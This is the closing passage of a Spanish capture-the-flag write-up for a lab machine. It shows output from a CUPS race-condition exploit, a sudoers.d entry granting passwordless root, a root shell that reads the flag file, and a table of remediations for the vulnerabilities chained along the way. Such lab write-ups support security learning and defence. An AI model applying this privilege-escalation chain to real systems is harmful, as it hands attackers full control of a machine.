[*] Starting token capture server...
[+] Captured Local token: CDFB4013860455AB28C5B9133EC231E7
[*] Creating file:// printer...
[-] Did not win the race.
```

El primer intento no ganó la condición de carrera — un resultado esperable dada la naturaleza probabilística de este tipo de _race condition_, que a menudo requiere varias iteraciones o ajustes en la secuencia de operaciones IPP (estado de aceptación de trabajos, reanudación de la cola) antes de que la ventana de tiempo se alinee favorablemente. Tras reintentar el ataque, el payload se escribió exitosamente en `/etc/sudoers.d/aporter`, otorgando a `aporter` permisos `NOPASSWD: ALL`. Verifiqué el resultado directamente con una shell de root:

```bash
aporter@portal:/tmp$ sudo -n /bin/bash
root@portal:/tmp# whoami
cat /root/root.txt
root
fcce38d9583ab667294a7b772f3e9a96
root@portal:/tmp# 
```

**Escalada confirmada.** Shell de root obtenida vía `sudo -n /bin/bash` sin necesidad de contraseña, y **flag de root capturada**: `fcce38d9583ab667294a7b772f3e9a96`.

## Conclusiones y recomendaciones

La compromisión total de Layover se apoyó en una combinación de debilidades de infraestructura y software desactualizado, más que en un único fallo crítico aislado. El vector decisivo fue la ausencia de cifrado en la red WiFi interna, que convirtió una simple interceptación pasiva de tráfico en la llave de entrada a toda la cadena posterior.

|   |   |
|---|---|
|Vulnerabilidad|Recomendación de remediación|
|WiFi abierta sin cifrado (`key_mgmt=NONE`)|Migrar a WPA2/WPA3-Enterprise con autenticación 802.1X; nunca transmitir credenciales de aplicación sobre un enlace sin cifrar, incluso en redes "internas"|
|CVE-2026-28695 (Craft CMS)|Actualizar a una versión de Craft CMS con el parche real aplicado; auditar cualquier endpoint que acepte condiciones de elementos serializadas desde el cliente|
|Secretos de aplicación cifrados con clave expuesta en `.env` accesible por `www-data`|Restringir permisos de lectura sobre `.env` al usuario de servicio estrictamente necesario; rotar `CRAFT_SECURITY_KEY` periódicamente y considerar un gestor de secretos externo (Vault, AWS Secrets Manager) en lugar de cifrado simétrico embebido en la aplicación|
|CVE-2026-34990 (CUPS)|Actualizar CUPS a una versión parcheada; deshabilitar el backend `file://` y restringir la creación de impresoras locales (`cups-browsed`, `CUPS-Create-Local-Printer`) a usuarios administrativos|
|Credencial de contratista de alto privilegio relativo|Aplicar principio de mínimo privilegio sobre cuentas de acceso remoto temporal; limitar superficie de pivote de red (segmentación, firewalls entre VLANs de invitados y redes de gestión)|

En conjunto, la ruta de ataque demuestra cómo fallos individualmente moderados — una red sin cifrar, una vulnerabilidad de aplicación sin parchear del todo, y un demonio del sistema desactualizado — se encadenan hasta producir una compromisión completa cuando no existe defensa en profundidad entre cada capa.